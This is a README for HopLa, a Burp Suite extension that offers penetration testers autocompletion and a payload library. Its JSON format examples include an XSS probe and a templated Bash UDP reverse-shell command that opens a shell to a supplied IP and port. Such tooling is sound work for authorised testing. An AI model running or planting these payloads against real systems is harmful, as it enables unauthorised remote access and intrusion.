# HopLa

💥 All the power of PayloadsAllTheThings, without the overhead. 
This extension adds autocompletion support and useful payloads in Burp Suite to make your intrusion easier.

Feel free to improve with your payloads ! ❤️

Developed by Alexis Danizan [![Twitter Follow](https://img.shields.io/twitter/follow/alexisdanizan?style=social)](https://twitter.com/alexisdanizan/)  
Released as open source by [Synacktiv 🥷](https://www.synacktiv.com/) 


![Demo GIF](img/demo.gif)

## Getting started


### Installation

 * Download the jar file from the release directory
 * Add it to Burp Suite using the Extender tab

### Build

Execute `gradle build` and you'll have the plugin ready in `releases/HopLa.jar`.

## Usage

By default HopLa is shipped with default payloads. You can add yours by loading a custom JSON file in the the menu. 

At the first usage HopLa creates a JSON file containing all the payloads in the jar file directory.

Press `Ctrl+Q` to display the payload library menu.

You can disable the global autocompletion in the top menu.

For i3, add the following line to `$HOME/.config/i3/config` for floating frame:

```
for_window [class=".*burp-StartBurp.*" title="^ $"] floating enable
```

### How to add payloads

The JSON payloads file follow the structure:

```json
{
    "categories": [
        {
            "name": "XSS",
            "values": [
                {
                    "name": "Simple",
                    "value": "<script>alert(1)</script>"
                },
                {
                    "name": "Multiline",
                    "value": "AAAA\nBBBB"
                },
                {
                    "name" : "Nested XSS menu",
                    "values": [
                        {
                            "name": "Simple 2",
                            "value": "<script>alert(1)</script>"
                        }
                    ]
                }
            ]
        }
    ],
    "keywords": [
        {
            "name": "Headers",
            "values": [
                "X-Forwarded-For",
                "X-Originally-Forwarded-For",
                "X-Originating-Ip",
                "X-Originating-IP"
            ]
        }
    ]
}
```
There is no nesting limit.

You can automatically add a prompt dialog:
```json
{
    "name":  "Bash UDP",
    "value":  "sh -i >& /dev/udp/§IP§/§PORT§ 0>&1",
    "prompt": ["IP","PORT"]
},
```

To add only keywords that do not appear in the menu, you can add them in the keywords category:

```json
{
    "keywords": [
        {
            "name": "Headers",
            "values": [
                "X-Forwarded-For",
                "X-Originally-Forwarded-For",
                "X-Originating-Ip",
                "X-Originating-IP"
            ]
        }
    ]
}
```

## Roadmap

* Support custom key binding for payload menu

## Thanks To

 * https://github.com/Static-Flow/BurpSuiteAutoCompletion
 * https://github.com/d3vilbug/HackBar
 * https://github.com/swisskyrepo/PayloadsAllTheThings

Thanks a lot for your awesome work !

## License

Released under BSD 3-Clause License see LICENSE for more information

Please feel free to report bugs, suggest features, or send pull requests.
